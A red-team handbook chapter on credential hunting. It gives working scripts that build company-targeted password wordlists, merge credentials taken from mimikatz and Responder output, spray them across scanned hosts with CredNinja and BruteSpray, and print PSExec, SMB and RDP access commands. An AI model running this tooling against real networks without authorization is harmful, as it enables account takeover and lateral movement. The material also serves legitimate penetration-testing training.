# Chapter 18: Credential Hunting and Management

Building on the password cracking tools discussed in the previous chapter, this chapter explores specialized tools for discovering credentials in various contexts, generating targeted wordlists from obtained information, and managing credentials throughout a red team engagement. These tools help automate the tedious aspects of credential management while maximizing the effectiveness of discovered authentication materials.

## Introduction to Credential Hunting

Credential hunting involves discovering usernames, passwords, and other authentication materials from various sources, including websites, documents, and network traffic. In red team operations, effective credential hunting serves several critical purposes:

- **Expanding access**: Using discovered credentials to access additional systems
- **Privilege escalation**: Finding higher-privileged credentials for vertical movement
- **Targeted wordlist generation**: Creating organization-specific password dictionaries
- **Authentication validation**: Testing discovered credentials across multiple systems
- **Access persistence**: Maintaining long-term access using legitimate credentials

This chapter covers four powerful tools that enable different aspects of credential hunting and management, from website-specific wordlist generation to mass credential validation.

## CeWL: Custom Wordlist Generator

CeWL (Custom Word List generator) is a specialized tool that crawls websites and extracts potential password candidates. It's particularly effective for creating organization-specific wordlists based on terminology commonly used within the target company.

### Installation

```bash
# On Debian/Ubuntu-based systems
sudo apt update
sudo apt install cewl

# Using gem
sudo gem install cewl

# From source
git clone https://github.com/digininja/CeWL.git
cd CeWL
bundle install
```

### Basic Usage

```bash
# Basic syntax
cewl [options] <url>

# Simple crawl of a website
cewl https://example.com -w wordlist.txt

# Set crawl depth (default is 2)
cewl https://example.com -d 3 -w wordlist.txt

# Minimum word length (default is 3)
cewl https://example.com -m 5 -w wordlist.txt

# Include metadata from documents
cewl https://example.com --with-numbers -m 5 -w wordlist.txt
```

### Website Scraping for Organization-Specific Terms

CeWL's primary strength is its ability to extract terminology unique to an organization:

#### 1. Comprehensive Website Crawling

```bash
# Deep crawl of main website
cewl https://company.com -d 4 -m 4 --with-numbers -w company_terms.txt

# Crawl specific sections likely to contain unique terminology
cewl https://company.com/about -d 2 -m 4 -w about_terms.txt
cewl https://company.com/products -d 3 -m 4 -w product_terms.txt
cewl https://company.com/services -d 3 -m 4 -w service_terms.txt

# Crawl the blog/news section for current projects and initiatives
cewl https://company.com/blog -d 3 -m 4 -w blog_terms.txt
```

#### 2. Document Metadata Extraction

```bash
# Extract metadata from documents
cewl https://company.com -d 3 --meta -w metadata_terms.txt

# Extract email addresses
cewl https://company.com -d 3 --email -e -w emails.txt
```

#### 3. Social Media Mining

```bash
# Crawl company social media profiles
cewl https://linkedin.com/company/companyname -d 2 -m 4 -w linkedin_terms.txt
cewl https://twitter.com/companyname -d 2 -m 4 -w twitter_terms.txt
```

### Example: Creating Targeted Wordlists

This example demonstrates a comprehensive workflow for creating organization-specific wordlists:

1. **Initial information gathering and basic scraping**:

```bash
# Create a directory for the engagement
mkdir -p company_engagement/wordlists
cd company_engagement

# Gather basic company information
echo "Company Name: Acme Technologies" > company_info.txt
echo "Industry: Software Security" >> company_info.txt
echo "Founded: 1998" >> company_info.txt
echo "Products: SecureGuard, NetDefender, CloudProtect" >> company_info.txt
echo "CEO: Jane Smith" >> company_info.txt

# Basic website scrape
cewl https://acmetech.example.com -d 3 -m 3 --with-numbers -w wordlists/acme_basic.txt

# Crawl specific sections
cewl https://acmetech.example.com/about-us -d 2 -m 3 -w wordlists/acme_about.txt
cewl https://acmetech.example.com/products -d 3 -m 3 -w wordlists/acme_products.txt
cewl https://acmetech.example.com/careers -d 2 -m 3 -w wordlists/acme_careers.txt
```

2. **Extract and organize discovered terms**:

```bash
# Combine all word lists
cat wordlists/acme_*.txt | sort -u > wordlists/acme_combined.txt

# Create a script to filter and categorize terms
cat > categorize_terms.py << 'EOF'
#!/usr/bin/env python3
import re
import sys

def load_words(filename):
    with open(filename, 'r') as f:
        return [line.strip() for line in f if line.strip()]

def main():
    if len(sys.argv) < 2:
        print("Usage: {} <wordlist>".format(sys.argv[0]))
        sys.exit(1)
    
    words = load_words(sys.argv[1])
    
    # Categorize words
    products = []
    tech_terms = []
    potential_names = []
    potential_acronyms = []
    
    # Load company info
    company_info = open('company_info.txt', 'r').read().lower()
    
    for word in words:
        # Skip words that are too short
        if len(word) < 4:
            continue
            
        # Check for product names from company info
        if word.lower() in company_info:
            products.append(word)
            continue
            
        # Check for potential acronyms (all caps, 2-6 chars)
        if re.match(r'^[A-Z]{2,6}$', word):
            potential_acronyms.append(word)
            continue
            
        # Check for tech terms (containing common tech words)
        tech_words = ['secure', 'network', 'cloud', 'cyber', 'data', 'protection', 
                      'defense', 'guard', 'shield', 'firewall', 'encryption', 'key']
        if any(tech_word in word.lower() for tech_word in tech_words):
            tech_terms.append(word)
            continue
            
        # Check for potential names (capitalized words)
        if re.match(r'^[A-Z][a-z]+$', word) and len(word) > 3:
            potential_names.append(word)
    
    # Save categorized words
    with open('wordlists/products.txt', 'w') as f:
        f.write('\n'.join(sorted(set(products))))
    
    with open('wordlists/tech_terms.txt', 'w') as f:
        f.write('\n'.join(sorted(set(tech_terms))))
    
    with open('wordlists/names.txt', 'w') as f:
        f.write('\n'.join(sorted(set(potential_names))))
    
    with open('wordlists/acronyms.txt', 'w') as f:
        f.write('\n'.join(sorted(set(potential_acronyms))))
    
    print("Categorized {} words into:".format(len(words)))
    print("  - Products: {} terms".format(len(products)))
    print("  - Tech terms: {} terms".format(len(tech_terms)))
    print("  - Potential names: {} terms".format(len(potential_names)))
    print("  - Potential acronyms: {} terms".format(len(potential_acronyms)))

if __name__ == "__main__":
    main()
EOF

chmod +x categorize_terms.py
./categorize_terms.py wordlists/acme_combined.txt
```

3. **Generate password candidates**:

```bash
# Create a script to generate password mutations
cat > generate_passwords.py << 'EOF'
#!/usr/bin/env python3
import sys
import itertools

def load_words(filename):
    try:
        with open(filename, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        return []

def generate_mutations(word):
    mutations = []
    
    # Original word
    mutations.append(word)
    
    # Capitalized
    mutations.append(word.capitalize())
    
    # All lowercase
    mutations.append(word.lower())
    
    # All uppercase
    mutations.append(word.upper())
    
    # With common years
    years = ["2023", "2022", "2021", "2020", "1998"]
    for year in years:
        mutations.append(word + year)
        mutations.append(word.lower() + year)
        mutations.append(word.capitalize() + year)
    
    # With common special characters
    for char in ["!", "@", "#", "$", "%"]:
        mutations.append(word + char)
        mutations.append(word.lower() + char)
        mutations.append(word.capitalize() + char)
        
        # With years and special chars
        for year in years:
            mutations.append(word + year + char)
            mutations.append(word.lower() + year + char)
            mutations.append(word.capitalize() + year + char)
    
    # Common substitutions
    subs = {'a':'@', 'e':'3', 'i':'1', 'o':'0', 's':'$'}
    
    # Apply one substitution at a time
    for char, replacement in subs.items():
        if char in word.lower():
            new_word = word.lower()
            new_word = new_word.replace(char, replacement)
            mutations.append(new_word)
            mutations.append(new_word.capitalize())
            
            # With common suffixes
            mutations.append(new_word + "123")
            mutations.append(new_word + "!")
    
    return mutations

def main():
    if len(sys.argv) < 2:
        print("Usage: {} <output_file> [input_files...]".format(sys.argv[0]))
        sys.exit(1)
    
    output_file = sys.argv[1]
    input_files = sys.argv[2:]
    
    all_words = []
    for input_file in input_files:
        all_words.extend(load_words(input_file))
    
    # Remove duplicates and very short words
    all_words = [w for w in set(all_words) if len(w) >= 4]
    
    print("Loaded {} unique words from {} files".format(len(all_words), len(input_files)))
    
    # Generate mutations for each word
    all_passwords = []
    for word in all_words:
        all_passwords.extend(generate_mutations(word))
    
    # Generate common combinations for important terms
    products = load_words('wordlists/products.txt')
    years = ["2023", "2022", "2021", "2020", "1998"]
    
    for product in products[:5]:  # Limit to top 5 products for reasonable size
        for year in years:
            for special in ["!", "@", "#", "$", ""]:
                all_passwords.append(product + year + special)
                all_passwords.append(product.capitalize() + year + special)
                all_passwords.append(product.lower() + year + special)
    
    # Remove duplicates and sort
    all_passwords = sorted(set(all_passwords))
    
    # Write to output file
    with open(output_file, 'w') as f:
        f.write('\n'.join(all_passwords))
    
    print("Generated {} password candidates saved to {}".format(len(all_passwords), output_file))

if __name__ == "__main__":
    main()
EOF

chmod +x generate_passwords.py
./generate_passwords.py wordlists/acme_passwords.txt wordlists/products.txt wordlists/tech_terms.txt wordlists/names.txt
```

This comprehensive approach is effective because:
- It discovers terminology unique to the target organization
- It categorizes terms by likely importance (products, names, tech terms)
- It generates password variations based on common password creation patterns
- It focuses on high-value terms to keep the wordlist size manageable

CeWL's integration with other tools provides a powerful pipeline for creating highly targeted wordlists that dramatically increase the effectiveness of password cracking attempts against organization-specific credentials.

## Crunch: Wordlist Generation

Crunch is a powerful tool for generating customized wordlists based on character sets and patterns. Unlike CeWL, which extracts existing terms, Crunch creates wordlists from scratch based on specified patterns and rules.

### Installation

```bash
# On Debian/Ubuntu-based systems
sudo apt update
sudo apt install crunch

# From source
git clone https://github.com/crunchsec/crunch.git
cd crunch
make
sudo make install
```

### Basic Usage

```bash
# Basic syntax
crunch <min-len> <max-len> [charset] [options]

# Generate all possible 4-digit PINs
crunch 4 4 0123456789 -o pins.txt

# Generate 6-character alphanumeric passwords
crunch 6 6 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -o alphanum6.txt

# Use predefined character sets
crunch 8 8 -f /usr/share/crunch/charset.lst mixalpha-numeric -o mixedpass.txt
```

### Pattern-based Generation

Crunch excels at creating wordlists based on specific patterns:

#### 1. Fixed Patterns

```bash
# Generate words matching a pattern
# @ = lowercase letters, , = uppercase letters, % = numbers, ^ = symbols
crunch 8 8 -t pass%%%%

# Company name + 4 digits
crunch 10 10 -t acme%%%%%%
```

#### 2. Character Set Customization

```bash
# Create a custom charset
echo "charset_name = abcdefghijklmnopqrstuvwxyz0123456789" > custom.lst

# Use the custom charset
crunch 6 8 -f custom.lst charset_name
```

#### 3. Permutation Generation

```bash
# Generate all permutations of a character set
crunch 4 4 0123456789 -p 0123456789
```

### Example: Exhaustive Smaller Character Sets

This example demonstrates using Crunch to generate targeted wordlists for specialized scenarios:

1. **Generate PIN code variations**:

```bash
# Create a script for common PIN patterns
cat > generate_pins.sh << 'EOF'
#!/bin/bash

OUTPUT_DIR="pin_wordlists"
mkdir -p $OUTPUT_DIR

echo "[+] Generating common PIN patterns..."

# All 4-digit PINs
echo "[*] Generating all 4-digit PINs..."
crunch 4 4 0123456789 -o $OUTPUT_DIR/all_4digit_pins.txt

# Birth year PINs (1950-2010)
echo "[*] Generating birth year PINs..."
for year in $(seq 1950 2010); do
    echo "19${year:2:2}" >> $OUTPUT_DIR/birth_years.txt
    echo "20${year:2:2}" >> $OUTPUT_DIR/birth_years.txt
done

# Common patterns (repeating, sequential)
echo "[*] Generating sequential and repeating PINs..."
for i in {0..9}; do
    # Repeating digit (e.g., 1111, 2222)
    echo "${i}${i}${i}${i}" >> $OUTPUT_DIR/repeating_pins.txt
    
    # Repeating pairs (e.g., 1212, 2323)
    for j in {0..9}; do
        echo "${i}${j}${i}${j}" >> $OUTPUT_DIR/repeating_pairs.txt
    done
    
    # Ascending sequences
    if [ $i -le 6 ]; then
        echo "${i}$((i+1))$((i+2))$((i+3))" >> $OUTPUT_DIR/sequential_pins.txt
    fi
    
    # Descending sequences
    if [ $i -ge 3 ]; then
        echo "${i}$((i-1))$((i-2))$((i-3))" >> $OUTPUT_DIR/sequential_pins.txt
    fi
done

# Combine all PIN files
cat $OUTPUT_DIR/*.txt | sort -u > $OUTPUT_DIR/all_pin_patterns.txt

echo "[+] Generated $(wc -l < $OUTPUT_DIR/all_pin_patterns.txt) PIN patterns"
EOF

chmod +x generate_pins.sh
./generate_pins.sh
```

2. **Generate target-specific short passwords**:

```bash
# Create a script for company-specific short passwords
cat > generate_short_passwords.sh << 'EOF'
#!/bin/bash

COMPANY=$1
YEAR=$2
OUTPUT_FILE=$3

if [ -z "$COMPANY" ] || [ -z "$YEAR" ] || [ -z "$OUTPUT_FILE" ]; then
    echo "Usage: $0 <company_name> <year> <output_file>"
    echo "Example: $0 acme 1998 short_passwords.txt"
    exit 1
fi

echo "[+] Generating short passwords for $COMPANY founded in $YEAR..."

# Convert to lowercase
COMPANY_LOWER=$(echo $COMPANY | tr '[:upper:]' '[:lower:]')

# Generate variations
mkdir -p temp
> temp/variations.txt

# Company name + year (full and short)
echo "$COMPANY_LOWER$YEAR" >> temp/variations.txt
echo "$COMPANY_LOWER${YEAR:2:2}" >> temp/variations.txt

# Company name + special char + year
for char in '!' '@' '#' '$' '%'; do
    echo "$COMPANY_LOWER$char$YEAR" >> temp/variations.txt
    echo "$COMPANY_LOWER$char${YEAR:2:2}" >> temp/variations.txt
done

# Use crunch to generate character substitutions
SUBS=("a@" "e3" "i1" "o0" "s\$")

# Apply substitutions one at a time
for sub in "${SUBS[@]}"; do
    original=${sub:0:1}
    replacement=${sub:1:1}
    
    if [[ $COMPANY_LOWER == *"$original"* ]]; then
        modified=${COMPANY_LOWER//$original/$replacement}
        echo "$modified$YEAR" >> temp/variations.txt
        echo "$modified${YEAR:2:2}" >> temp/variations.txt
        
        # With special chars
        for char in '!' '@' '#' '$' '%'; do
            echo "$modified$char$YEAR" >> temp/variations.txt
            echo "$modified$char${YEAR:2:2}" >> temp/variations.txt
        done
    fi
done

# Use crunch for additional patterns
crunch 8 8 -t "$COMPANY_LOWER@@" > temp/company_pattern1.txt
crunch 8 8 -t "$COMPANY_LOWER##" > temp/company_pattern2.txt

# Combine all files
cat temp/variations.txt temp/company_pattern*.txt | sort -u > $OUTPUT_FILE

# Clean up
rm -rf temp

echo "[+] Generated $(wc -l < $OUTPUT_FILE) passwords in $OUTPUT_FILE"
EOF

chmod +x generate_short_passwords.sh
./generate_short_passwords.sh acme 1998 acme_short_passwords.txt
```

This approach is effective because:
- It focuses on exhaustive coverage of smaller search spaces
- It incorporates known patterns in PIN and short password selection
- It creates manageable wordlists for specialized targets
- It can be used for specific scenarios like PIN codes, device passwords, etc.

While Crunch can generate massive wordlists, its real value in red team operations is generating highly focused lists for specific scenarios where completeness is more important than breadth.

## CredNinja: Credential Validation

CredNinja is a tool designed for rapidly testing discovered credentials across multiple targets. It helps red teamers efficiently validate and organize credentials found during an engagement.

### Installation

```bash
# Clone the repository
git clone https://github.com/Raikia/CredNinja.git
cd CredNinja

# No installation required, it's a Python script
```

### Basic Usage

```bash
# Basic syntax
python3 credninja.py [options] -a <usernames:passwords> -t <targets>

# Test a single credential against multiple hosts
python3 credninja.py -a "administrator:Password123" -t targets.txt

# Test multiple credentials against multiple hosts
python3 credninja.py -a credentials.txt -t targets.txt

# Specify the domain
python3 credninja.py -a credentials.txt -t targets.txt -d CONTOSO.COM

# Enable verbose output
python3 credninja.py -a credentials.txt -t targets.txt -v
```

### Mass Validation Techniques

CredNinja offers several features specifically designed for large-scale credential validation:

#### 1. Credential Formatting

```bash
# Prepare credentials file in username:password format
cat > credentials.txt << EOF
administrator:Winter2023!
jsmith:Welcome123
aadams:Company2023
sysadmin:P@ssw0rd
EOF

# Prepare targets file (one IP or hostname per line)
cat > targets.txt << EOF
192.168.1.10
192.168.1.11
192.168.1.12
fileserver.local
dc01.local
EOF
```

#### 2. Threading and Performance Optimization

```bash
# Use multiple threads for faster checking
python3 credninja.py -a credentials.txt -t targets.txt -T 10

# Control timeout for unresponsive hosts
python3 credninja.py -a credentials.txt -t targets.txt -o 5
```

#### 3. Output Formats

```bash
# Save results in CSV format
python3 credninja.py -a credentials.txt -t targets.txt -R results.csv

# Generate a BloodHound-compatible mapping file
python3 credninja.py -a credentials.txt -t targets.txt -B
```

### Example: Testing Discovered Credentials Across Networks

This example demonstrates a complete workflow for validating discovered credentials:

1. **Organize credentials from various sources**:

```bash
# Create a directory for credential testing
mkdir -p cred_validation
cd cred_validation

# Combine credentials from different sources
cat > combine_creds.py << 'EOF'
#!/usr/bin/env python3
import sys
import re
import csv

def parse_mimikatz(filename):
    creds = []
    with open(filename, 'r') as f:
        content = f.read()
        # Extract username and password from mimikatz output
        matches = re.finditer(r'Username\s+:\s+(\S+)\s+Password\s+:\s+(\S+)', content)
        for match in matches:
            user = match.group(1)
            password = match.group(2)
            if password and password != '(null)':
                creds.append((user, password))
    return creds

def parse_hashcat(filename):
    creds = []
    with open(filename, 'r') as f:
        for line in f:
            parts = line.strip().split(':')
            if len(parts) >= 2:
                user = parts[0]
                password = parts[-1]
                creds.append((user, password))
    return creds

def parse_responder(filename):
    creds = []
    with open(filename, 'r') as f:
        for line in f:
            if 'NTLMv2-SSP Hash' in line:
                parts = line.split(':')
                if len(parts) >= 2:
                    user_domain = parts[0].split('/')
                    user = user_domain[-1]
                    # For Responder, we don't have cleartext passwords
                    # but we can use the hash for pass-the-hash
                    hash_val = ':'.join(parts[2:]).strip()
                    creds.append((user, f"HASH:{hash_val}"))
    return creds

def main():
    if len(sys.argv) < 2:
        print("Usage: {} <output_file> [<input_files>...]".format(sys.argv[0]))
        sys.exit(1)
    
    output_file = sys.argv[1]
    input_files = sys.argv[2:]
    
    all_creds = []
    for input_file in input_files:
        try:
            if 'mimikatz' in input_file.lower():
                all_creds.extend(parse_mimikatz(input_file))
            elif 'hashcat' in input_file.lower() or 'cracked' in input_file.lower():
                all_creds.extend(parse_hashcat(input_file))
            elif 'responder' in input_file.lower():
                all_creds.extend(parse_responder(input_file))
            else:
                # Default format: username:password
                with open(input_file, 'r') as f:
                    for line in f:
                        parts = line.strip().split(':')
                        if len(parts) >= 2:
                            user = parts[0]
                            password = ':'.join(parts[1:])
                            all_creds.append((user, password))
        except Exception as e:
            print(f"Error processing {input_file}: {e}")
    
    # Remove duplicates (same username and password)
    unique_creds = list(set(all_creds))
    
    # Format for CredNinja
    with open(output_file, 'w') as f:
        for user, password in unique_creds:
            f.write(f"{user}:{password}\n")
    
    print(f"Processed {len(all_creds)} credentials from {len(input_files)} files")
    print(f"Saved {len(unique_creds)} unique credentials to {output_file}")

if __name__ == "__main__":
    main()
EOF

chmod +x combine_creds.py

# Example usage with different credential sources
./combine_creds.py all_credentials.txt mimikatz_output.txt hashcat_cracked.txt responder_hashes.txt manual_creds.txt
```

2. **Prepare targets based on discovered hosts**:

```bash
# Combine hosts from different network scans
cat > combine_hosts.py << 'EOF'
#!/usr/bin/env python3
import sys
import re
import ipaddress

def parse_nmap(filename):
    hosts = []
    with open(filename, 'r') as f:
        content = f.read()
        # Extract hosts with open port 445 (SMB)
        matches = re.finditer(r'Discovered open port 445/tcp on (\d+\.\d+\.\d+\.\d+)', content)
        for match in matches:
            hosts.append(match.group(1))
    return hosts

def parse_nbtscan(filename):
    hosts = []
    with open(filename, 'r') as f:
        for line in f:
            parts = line.strip().split()
            if len(parts) >= 1:
                try:
                    # Check if the first field is a valid IP
                    ipaddress.ip_address(parts[0])
                    hosts.append(parts[0])
                except ValueError:
                    pass
    return hosts

def parse_hostfile(filename):
    hosts = []
    with open(filename, 'r') as f:
        for line in f:
            host = line.strip()
            if host and not host.startswith('#'):
                hosts.append(host)
    return hosts

def main():
    if len(sys.argv) < 2:
        print("Usage: {} <output_file> [<input_files>...]".format(sys.argv[0]))
        sys.exit(1)
    
    output_file = sys.argv[1]
    input_files = sys.argv[2:]
    
    all_hosts = []
    for input_file in input_files:
        try:
            if 'nmap' in input_file.lower():
                all_hosts.extend(parse_nmap(input_file))
            elif 'nbtscan' in input_file.lower():
                all_hosts.extend(parse_nbtscan(input_file))
            else:
                # Default format: one host per line
                all_hosts.extend(parse_hostfile(input_file))
        except Exception as e:
            print(f"Error processing {input_file}: {e}")
    
    # Remove duplicates
    unique_hosts = sorted(set(all_hosts))
    
    # Write to output file
    with open(output_file, 'w') as f:
        for host in unique_hosts:
            f.write(f"{host}\n")
    
    print(f"Processed {len(all_hosts)} hosts from {len(input_files)} files")
    print(f"Saved {len(unique_hosts)} unique hosts to {output_file}")

if __name__ == "__main__":
    main()
EOF

chmod +x combine_hosts.py

# Example usage with different host sources
./combine_hosts.py all_targets.txt nmap_scan.txt nbtscan_output.txt additional_hosts.txt
```

3. **Run CredNinja with optimal settings**:

```bash
# Create a CredNinja wrapper script
cat > run_credninja.sh << 'EOF'
#!/bin/bash

CREDS_FILE=$1
TARGETS_FILE=$2
DOMAIN=$3
OUTPUT_DIR="credninja_results_$(date +%Y%m%d_%H%M%S)"

if [ -z "$CREDS_FILE" ] || [ -z "$TARGETS_FILE" ]; then
    echo "Usage: $0 <credentials_file> <targets_file> [domain]"
    echo "Example: $0 all_credentials.txt all_targets.txt CONTOSO.COM"
    exit 1
fi

mkdir -p $OUTPUT_DIR

# Count number of credentials and targets
CRED_COUNT=$(wc -l < $CREDS_FILE)
TARGET_COUNT=$(wc -l < $TARGETS_FILE)

echo "[+] Starting CredNinja with $CRED_COUNT credentials against $TARGET_COUNT targets"

# Calculate optimal thread count (adjust based on available resources)
THREADS=10
if [ $TARGET_COUNT -gt 100 ]; then
    THREADS=20
fi
if [ $TARGET_COUNT -gt 500 ]; then
    THREADS=30
fi

# Run CredNinja with appropriate options
if [ -z "$DOMAIN" ]; then
    python3 ../CredNinja/credninja.py -a $CREDS_FILE -t $TARGETS_FILE -T $THREADS -o 5 -v -R $OUTPUT_DIR/results.csv
else
    python3 ../CredNinja/credninja.py -a $CREDS_FILE -t $TARGETS_FILE -d $DOMAIN -T $THREADS -o 5 -v -R $OUTPUT_DIR/results.csv
fi

# Parse results for easy reference
echo "[+] Parsing results..."

# Extract successful credentials by host
python3 -c "
import csv

successes = {}
with open('$OUTPUT_DIR/results.csv', 'r') as f:
    reader = csv.reader(f)
    next(reader)  # Skip header
    for row in reader:
        host, username, password, status = row
        if status == 'Success':
            if host not in successes:
                successes[host] = []
            successes[host].append((username, password))

print(f'\n[+] Found valid credentials for {len(successes)} hosts:')
for host, creds in sorted(successes.items()):
    print(f'\n[*] {host}:')
    for username, password in creds:
        print(f'    - {username}:{password}')

# Create individual files for different tools
with open('$OUTPUT_DIR/valid_credentials.txt', 'w') as f:
    for host, creds in sorted(successes.items()):
        for username, password in creds:
            f.write(f'{username}:{password}\n')

with open('$OUTPUT_DIR/psexec_targets.txt', 'w') as f:
    for host, creds in sorted(successes.items()):
        username, password = creds[0]  # Take first valid cred for each host
        f.write(f'{host}:{username}:{password}\n')
"

echo "[+] Results saved to $OUTPUT_DIR/"
echo "[+] Use $OUTPUT_DIR/valid_credentials.txt for general credential usage"
echo "[+] Use $OUTPUT_DIR/psexec_targets.txt for direct PSExec access"
EOF

chmod +x run_credninja.sh

# Run the script
./run_credninja.sh all_credentials.txt all_targets.txt ACME.LOCAL
```

This approach to credential validation is effective because:
- It consolidates credentials from multiple sources into a standard format
- It organizes targets based on network scan data
- It optimizes performance with appropriate threading
- It formats results for use with other tools like PSExec
- It creates a clear view of which credentials work on which systems

CredNinja's mass validation capabilities help red teamers quickly transform discovered credentials into actionable access across the network.

## BruteSpray: Service Bruteforcing

BruteSpray is a tool that automates the process of testing credentials against services discovered in Nmap scans. It bridges the gap between network discovery and credential testing in a seamless workflow.

### Installation

```bash
# Clone the repository
git clone https://github.com/x90skysn3k/brutespray.git
cd brutespray

# Install dependencies
pip3 install -r requirements.txt
```

### Basic Usage

```bash
# Basic syntax
python3 brutespray.py -f <nmap.xml> [options]

# Simple scan with default settings
python3 brutespray.py -f nmap_scan.xml

# Specify username and password lists
python3 brutespray.py -f nmap_scan.xml -U users.txt -P passwords.txt

# Target specific services
python3 brutespray.py -f nmap_scan.xml -s ssh,ftp

# Increase threads for faster scanning
python3 brutespray.py -f nmap_scan.xml -t 5 -T 10
```

### Example: From Nmap to Access

This example demonstrates a complete workflow from network scanning to gaining access:

1. **Perform initial network scan with Nmap**:

```bash
# Create a directory for the assessment
mkdir -p network_assessment
cd network_assessment

# Run Nmap scan with service detection and save to XML
nmap -sS -sV -p 21,22,23,25,80,110,139,389,443,445,3306,3389,5432,8080 -oA initial_scan 192.168.1.0/24
```

2. **Prepare custom wordlists based on the organization**:

```bash
# Create simple organization-specific wordlists
cat > users.txt << EOF
admin
administrator
root
sysadmin
webadmin
backup
user
guest
service
sql
oracle
postgres
EOF

cat > passwords.txt << EOF
password
Password123
P@ssw0rd
Welcome123
acme2023
Acme2023!
Winter2023
Winter2023!
Passw0rd!
EOF
```

3. **Create a BruteSpray wrapper script**:

```bash
# Create a script to run BruteSpray with proper settings
cat > run_brutespray.sh << 'EOF'
#!/bin/bash

NMAP_FILE=$1
OUTPUT_DIR="brutespray_results_$(date +%Y%m%d_%H%M%S)"

if [ -z "$NMAP_FILE" ]; then
    echo "Usage: $0 <nmap_xml_file>"
    echo "Example: $0 initial_scan.xml"
    exit 1
fi

mkdir -p $OUTPUT_DIR

echo "[+] Starting BruteSpray against services in $NMAP_FILE"

# Run BruteSpray in two phases:
# 1. Quick scan with most common credentials
echo "[*] Phase 1: Quick scan with common credentials"
python3 ../brutespray/brutespray.py -f $NMAP_FILE -o $OUTPUT_DIR/quick_scan \
    -U ../brutespray/wordlist/top_shortlist.txt \
    -P ../brutespray/wordlist/password_shortlist.txt \
    -t 4 -T 10 --quiet

# 2. Thorough scan with custom wordlists
echo "[*] Phase 2: Thorough scan with custom wordlists"
python3 ../brutespray/brutespray.py -f $NMAP_FILE -o $OUTPUT_DIR/full_scan \
    -U users.txt -P passwords.txt \
    -t 2 -T 5 --quiet

# Combine and parse results
echo "[+] Parsing results..."
cat $OUTPUT_DIR/quick_scan/* $OUTPUT_DIR/full_scan/* > $OUTPUT_DIR/all_results.txt

# Extract successful logins
grep -B 2 "SUCCESS" $OUTPUT_DIR/all_results.txt > $OUTPUT_DIR/successful_logins.txt

# Create service-specific credential files
mkdir -p $OUTPUT_DIR/credentials

echo "[+] Organizing credentials by service:"
for service in ssh ftp telnet smtp pop3 http https mysql mssql postgres rdp; do
    grep -A 2 -B 2 "$service" $OUTPUT_DIR/successful_logins.txt | grep -E "Host:|Username:|Password:|SUCCESS" > $OUTPUT_DIR/credentials/$service.txt
    
    count=$(grep "SUCCESS" $OUTPUT_DIR/credentials/$service.txt | wc -l)
    if [ $count -gt 0 ]; then
        echo "[*] $service: $count valid credentials found"
    fi
done

# Create combined credential file
> $OUTPUT_DIR/credentials/all_creds.txt
grep -A 3 "SUCCESS" $OUTPUT_DIR/all_results.txt | grep -E "Host:|Username:|Password:|SUCCESS" | awk '{
    if ($1 == "Host:") host = $2;
    if ($1 == "Username:") user = $2;
    if ($1 == "Password:") pass = $2;
    if ($0 ~ /SUCCESS/) {
        service = $0;
        gsub("SUCCESS: ", "", service);
        print host ":" service ":" user ":" pass;
    }
}' | sort -u >> $OUTPUT_DIR/credentials/all_creds.txt

echo "[+] Results saved to $OUTPUT_DIR/"
echo "[+] Found $(wc -l < $OUTPUT_DIR/credentials/all_creds.txt) valid credentials in total"
echo "[+] Check $OUTPUT_DIR/credentials/ for service-specific credentials"
EOF

chmod +x run_brutespray.sh

# Run the script
./run_brutespray.sh initial_scan.xml
```

4. **Convert successful logins to service-specific access commands**:

```bash
# Create a script to generate access commands
cat > generate_access.py << 'EOF'
#!/usr/bin/env python3
import sys
import os
import re

def parse_credentials(creds_file):
    credentials = []
    with open(creds_file, 'r') as f:
        for line in f:
            parts = line.strip().split(':')
            if len(parts) >= 4:
                host, service, username, password = parts
                credentials.append({
                    'host': host,
                    'service': service,
                    'username': username,
                    'password': password
                })
    return credentials

def generate_access_commands(credentials):
    commands = []
    
    for cred in credentials:
        host = cred['host']
        service = cred['service']
        username = cred['username']
        password = cred['password']
        
        if 'ssh' in service:
            commands.append(f"# SSH access to {host}")
            commands.append(f"sshpass -p '{password}' ssh {username}@{host}")
            commands.append("")
            
        elif 'ftp' in service:
            commands.append(f"# FTP access to {host}")
            commands.append(f"ftp -n {host} << EOF")
            commands.append(f"user {username} {password}")
            commands.append("ls")
            commands.append("bye")
            commands.append("EOF")
            commands.append("")
            
        elif 'mysql' in service:
            commands.append(f"# MySQL access to {host}")
            commands.append(f"mysql -h {host} -u {username} -p'{password}'")
            commands.append("")
            
        elif 'mssql' in service:
            commands.append(f"# MSSQL access to {host}")
            commands.append(f"impacket-mssqlclient {username}:{password}@{host}")
            commands.append("")
            
        elif 'postgres' in service:
            commands.append(f"# PostgreSQL access to {host}")
            commands.append(f"PGPASSWORD='{password}' psql -h {host} -U {username} -d postgres")
            commands.append("")
            
        elif 'rdp' in service or '3389' in service:
            commands.append(f"# RDP access to {host}")
            commands.append(f"xfreerdp /u:{username} /p:{password} /v:{host}")
            commands.append("")
            
        elif 'smb' in service or 'microsoft-ds' in service or '445' in service:
            commands.append(f"# SMB access to {host}")
            commands.append(f"smbclient -U {username}%{password} //{host}/C$")
            commands.append(f"# PSExec to {host}")
            commands.append(f"impacket-psexec {username}:{password}@{host}")
            commands.append("")
            
        elif 'http' in service or 'https' in service:
            protocol = 'https' if 'https' in service else 'http'
            commands.append(f"# Web access to {host}")
            commands.append(f"curl -k -u {username}:{password} {protocol}://{host}/")
            commands.append("")
            
    return commands

def main():
    if len(sys.argv) < 2:
        print("Usage: {} <credentials_file> [output_file]".format(sys.argv[0]))
        sys.exit(1)
    
    creds_file = sys.argv[1]
    output_file = sys.argv[2] if len(sys.argv) >= 3 else "access_commands.sh"
    
    credentials = parse_credentials(creds_file)
    commands = generate_access_commands(credentials)
    
    with open(output_file, 'w') as f:
        f.write("#!/bin/bash\n\n")
        f.write("# Access commands generated from " + creds_file + "\n\n")
        f.write("\n".join(commands))
    
    os.chmod(output_file, 0o755)
    
    print(f"Generated {len(credentials)} access commands in {output_file}")

if __name__ == "__main__":
    main()
EOF

chmod +x generate_access.py

# Generate access commands for all credentials
./generate_access.py brutespray_results_*/credentials/all_creds.txt access_commands.sh
```

This approach is effective because:
- It automates the entire workflow from network scanning to access
- It prioritizes commonly successful credentials before trying the full wordlist
- It organizes results by service for targeted exploitation
- It generates ready-to-use access commands for discovered credentials
- It scales efficiently across large networks

BruteSpray's tight integration with Nmap makes it particularly valuable in red team operations, where quickly converting scan results into access opportunities is essential.

## Advanced Credential Management Strategies

